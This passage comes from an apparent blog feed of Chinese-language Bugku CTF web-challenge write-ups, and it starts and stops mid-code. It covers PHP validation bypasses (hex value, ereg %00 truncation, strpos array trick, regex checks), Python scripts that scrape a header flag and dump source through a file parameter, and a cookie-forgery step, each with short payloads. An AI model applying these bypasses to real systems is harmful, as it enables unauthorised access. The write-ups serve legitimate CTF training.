&amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;&#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;&#125;</code></pre><p>è¾“å…¥çš„æ•°å­—ä¸­ä¸èƒ½åŒ…å«1-9çš„æ•°å­—</p><p>å¦‚æœè¾“å…¥çš„æ•°å­—å’Œç›¸ç­‰åˆ™æ‹¿åˆ°flag</p><p>å¯ä»¥æƒ³åˆ°çš„æ˜¯å°†è¿™æ®µæ•°å­—è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p><pre><code class="hljs apache"><span class="hljs-attribute">hex</span>(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de<span class="hljs-attribute">GET</span>:<span class="hljs-attribute">password</span>=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de</code></pre><h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxx&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)&#123;<span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;-&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;- have not been found&#x27;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ç»•è¿‡ä¸‰ä¸ªifè¯­å¥å³å¯æ‹¿åˆ°flag</p><p>ç¬¬ä¸€ä¸ª</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)</code></pre><p>è¿™ä¸ªæ¯”è¾ƒå¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå¾ˆå®¹æ˜“ç†è§£</p><p><code>[a-zA-Z0-9]+</code>åŒ…å«å¤§å°å†™å­—ç¬¦å’Œæ•°å­—ï¼Œ^æ˜¯åŒ¹é…å¼€å§‹æ ‡å¿—ï¼Œ$æ˜¯åŒ¹é…ç»“æŸæ ‡å¿—</p><p>ç¬¬äºŒä¸ª</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre><p>passwordå­—æ®µé•¿åº¦å°äº8ï¼Œä½†æ˜¯å¤§äº9999999ï¼Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•</p><p>ç¬¬ä¸‰ä¸ª</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;-&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)</code></pre><p>passwordè¦åŒ…å« <code>-</code>ï¼ˆåšé¢˜çš„æ—¶å€™ä¼šå‘ç°åº”è¯¥æ˜¯<code>*-*</code>ï¼‰</p><p>payload</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:<span class="hljs-attribute">password</span>=<span class="hljs-number">1</span>e<span class="hljs-number">9</span>%<span class="hljs-number">00</span>*-*</code></pre><p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" alt="zhengze.png"></p><h2 id="strposæ•°ç»„ç»•è¿‡"><a href="#strposæ•°ç»„ç»•è¿‡" class="headerlink" title="strposæ•°ç»„ç»•è¿‡"></a>strposæ•°ç»„ç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#x27;</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ç›´æ¥åˆ©ç”¨eregå’Œstrposå‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ç»•è¿‡</p><p>å½“è¾“å…¥ctf[]=11æ—¶ï¼Œeregè¿”å›å€¼null!==FALSE</p><p>strposè¿”å›å€¼ä¹Ÿä¸ºnull!=FALSE</p><p>æ‹¿åˆ°flag</p><p>payloadï¼š</p><pre><code class="hljs mel">GET:?ctf[]=<span class="hljs-number">111</span><span class="hljs-comment">//æ­£å¸¸åšæ³•</span>?nctf=<span class="hljs-number">1</span>%00%23biubiubiu</code></pre><h2 id="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"><a href="#æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡" class="headerlink" title="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"></a>æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])&#123;<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>)) <span class="hljs-comment">//preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… é•¿åº¦å¤§äº12</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<span class="hljs-comment">//è¿™é‡Œè¾“å‡ºçš„æ˜¯å‡flag çœŸçš„åœ¨ä¸‹é¢</span><span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)&#123;<span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))<span class="hljs-keyword">break</span>;<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);   <span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))<span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä»£ç è¿˜æŒºé•¿ï¼Œä½†æ˜¯ç›´æ¥æŠ“ä½é‡ç‚¹</p><pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match(&#x27;/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/&#x27;, $password))</code></pre><p>[:graph]æ˜¯æ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦,{12,},æ˜¯åœ¨passwordä¸­åŒ¹é…12æ¬¡ä»¥ä¸Šï¼Œå³passwordçš„é•¿åº¦å¤§äº12</p><p>ä¸‹é¢çš„æ­£åˆ™</p><pre><code class="hljs php"><span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);   <span class="hljs-comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))<span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;&#125;</code></pre><p>è¦æ±‚passwordä¸­å¿…é¡»åŒ…å«ä¸‰ç§ä»¥ä¸Šçš„ç±»å‹çš„å­—ç¬¦ï¼Œäºæ˜¯æ­£å¸¸æ„é€ å¦‚ä¸‹çš„payload</p><pre><code class="hljs llvm">POST:password<span class="hljs-operator">=</span><span class="hljs-number">42</span>adad<span class="hljs-comment">;d;;a</span>//éæ­£å¸¸çš„password<span class="hljs-operator">=</span><span class="hljs-number">42</span><span class="hljs-variable">%00</span>æˆ–è€…POSTä¸€ä¸ªä»»æ„ä¸ç­‰äºpasswordçš„å­—ç¬¦æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆåŸå› å¯¼è‡´çš„</code></pre><p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" alt="shuzi2.png"></p><p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" alt="shuzi1.png"></p><h2 id="ç®€å•waf"><a href="#ç®€å•waf" class="headerlink" title="ç®€å•waf"></a>ç®€å•waf</h2><p>ç½‘å€æ‰“ä¸å¼€</p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å˜é‡è¦†ç›–</tag>
      
      <tag>å‡½æ•°æ¼æ´</tag>
      
      <tag>ç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuåˆ·é¢˜è®°å½•2</title>
    <link href="/2020/09/10/bugku1/"/>
    <url>/2020/09/10/bugku1/</url>
    
    <content type="html"><![CDATA[<h1 id="bugkuåˆ·é¢˜è®°å½•2"><a href="#bugkuåˆ·é¢˜è®°å½•2" class="headerlink" title="bugkuåˆ·é¢˜è®°å½•2"></a>bugkuåˆ·é¢˜è®°å½•2</h1><span id="more"></span><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>æ‰“å¼€é¡µé¢æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p><p>æŠ“åŒ…çœ‹äº†çœ‹ï¼ŒæƒŠå–œçš„å‘ç°äº†flagå­—æ®µ</p><p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" alt></p><p>ä¸€æ®µbase64 è§£ç åä¸º<code>NDQyMDIy</code></p><p>æäº¤å‘ç°å¹¶ä¸å¯¹ã€‚ã€‚ã€‚çœ‹æ¥å¦æœ‰ç„æœº</p><p>å¤šgoå‡ æ¬¡åå‘ç°äº†flagå€¼ä¸€ç›´åœ¨å˜ï¼Œå¹¶ä¸”æœ‰ä¸€æ®µæç¤º</p><p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p><p>ç”¨postæ–¹æ³•æäº¤ä½ æ‰€å‘ç°çš„å†…å®¹ï¼Œåªå¥½ä½¿ç”¨è„šæœ¬ï¼ˆä¸ä¼šå†™ï¼‰</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url=<span class="hljs-string">&quot;http://120.24.86.145:8002/web6/&quot;</span>r=requests.session()headers=r.get(url).headers<span class="hljs-comment">#å› ä¸ºflagåœ¨æ¶ˆæ¯å¤´é‡Œ</span> mid=base64.b64decode(headers[<span class="hljs-string">&#x27;flag&#x27;</span>])mid=mid.decode()<span class="hljs-comment">#ä¸ºäº†ä¸‹ä¸€æ­¥ç”¨splitä¸æŠ¥é”™ï¼Œb64decodeåæ“ä½œçš„å¯¹è±¡æ˜¯byteç±»å‹çš„å­—ç¬¦ä¸²ï¼Œè€Œsplitå‡½æ•°è¦ç”¨strç±»å‹çš„</span> flag = base64.b64decode(mid.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#è·å¾—flag:åçš„å€¼</span>data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:flag&#125;<span class="hljs-built_in">print</span> (r.post(url,data).text)<span class="hljs-comment">#postæ–¹æ³•ä¼ ä¸Šå»</span></code></pre><p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" alt="headers.png"></p><h2 id="cookieæ¬ºéª—"><a href="#cookieæ¬ºéª—" class="headerlink" title="cookieæ¬ºéª—"></a>cookieæ¬ºéª—</h2><p>æ³¨æ„è§‚å¯Ÿurl<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p><p>line=2&amp;filename=a2V5cy50eHQ=</p><p><code>a2V5cy50eHQ=</code> è§£å¯†æ˜¯ä¸ºkey.txt   lineæ˜¯è¡Œçš„æ„æ€ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŸ¥çœ‹key.txtçš„ç¬¬lineè¡Œçš„ä»£ç </p><p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹<code>index.php</code>æºç   index.phpçš„base64å€¼ä¸º<code>aW5kZXgucGhw</code></p><p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" alt="cookie1.png"></p><p>æ”¹å˜lineçš„å€¼å¯ä»¥ä¸€è¡Œä¸€è¡Œçš„æŸ¥çœ‹æºç ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl1 = <span class="hljs-string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>url2 = <span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>mysession = requests.session()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):        r = mysession.get(url1+<span class="hljs-built_in">str</span>(i)+url2)    print(r.text)</code></pre><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);<span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,); <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123;       <span class="hljs-comment">//çœ‹è¿™é‡Œ</span><span class="hljs-variable">$file_list</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;&#125; <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;<span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p><p> è¿™é‡Œå¯ä»¥åˆ¤æ–­cookieå¿…é¡»æ»¡è¶³margin=marginæ‰èƒ½è®¿é—®keys.php</p><p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" alt="bp"></p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>æŸ¥çœ‹æºç æç¤ºäº†</p><p><code>&lt;!--1p.html--&gt;</code>     </p><p>ç›´æ¥è®¿é—®1p.html,å‘ç°ç›´æ¥è·³è½¬åˆ°äº†bugkuçš„ä¸»é¡µï¼Œå…ˆçœ‹æºç ï¼Œå‘ç°ä¸€æ®µç¼–ç åº”è¯¥æ˜¯base64</p><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre><p>base64è§£ç åä¸ºurlç¼–ç </p><pre><code class="hljs llvm"><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bif<span class="hljs-variable">%28</span><span class="hljs-variable">%21</span><span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>header<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>Location<span class="hljs-variable">%3</span>A<span class="hljs-variable">%20</span>hello.php<span class="hljs-variable">%3</span>Fid<span class="hljs-variable">%3</span>D<span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>exit<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>a<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>b<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span>stripos<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>.<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>echo<span class="hljs-variable">%20</span><span class="hljs-variable">%27</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>data<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-title">@file_get_contents</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>r<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>data<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>bugku<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>a<span class="hljs-variable">%20</span>nice<span class="hljs-variable">%20</span>plateform<span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span 